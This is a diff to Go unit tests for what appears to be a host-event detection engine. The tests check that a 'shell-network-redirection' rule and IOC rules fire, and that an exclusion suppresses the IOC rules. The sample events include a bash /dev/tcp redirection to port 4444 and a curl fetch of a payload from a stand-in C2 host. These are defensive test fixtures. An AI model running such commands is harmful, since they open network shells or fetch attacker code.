@@ -14,12 +14,49 @@ import (
 func TestDetect(t *testing.T) {
 	e := Event{Time: time.Now(), Host: "lab", PID: 12, Executable: "/usr/bin/bash", Command: "bash -c 'echo x >/dev/tcp/127.0.0.1/4444'"}
 	f := Detect(e)
-	if len(f) != 1 || f[0].Rule != "shell-network-redirection" {
-		t.Fatalf("unexpected finding: %+v", f)
+	if len(f) < 1 {
+		t.Fatalf("expected findings, got none")
+	}
+	found := false
+	for _, x := range f {
+		if x.Rule == "shell-network-redirection" {
+			found = true
+		}
+	}
+	if !found {
+		t.Fatalf("missing shell-network-redirection in %+v", f)
 	}
 	e.Command = "bash -c 'echo hello'"
 	if len(Detect(e)) != 0 {
 		t.Fatal("false positive")
+	}
+}
+
+func TestDetectIOCIOAExclusion(t *testing.T) {
+	e := Event{Time: time.Now(), Host: "lab", PID: 9, Executable: "/usr/bin/curl", Command: "curl http://evil-c2.example/payload"}
+	f := Detect(e)
+	iocHit := false
+	for _, x := range f {
+		if strings.HasPrefix(x.Rule, "ioc-") {
+			iocHit = true
+		}
+	}
+	if !iocHit {
+		t.Fatalf("expected IOC match, got %+v", f)
+	}
+	worldMu.Lock()
+	exclusions = append(exclusions, map[string]any{"pattern": "ioc-domain", "reason": "test"})
+	worldMu.Unlock()
+	t.Cleanup(func() {
+		worldMu.Lock()
+		exclusions = nil
+		worldMu.Unlock()
+	})
+	f2 := Detect(e)
+	for _, x := range f2 {
+		if strings.HasPrefix(x.Rule, "ioc-") {
+			t.Fatalf("exclusion failed: %+v", f2)
+		}
 	}
 }
 func TestStoreAndAPI(t *testing.T) {
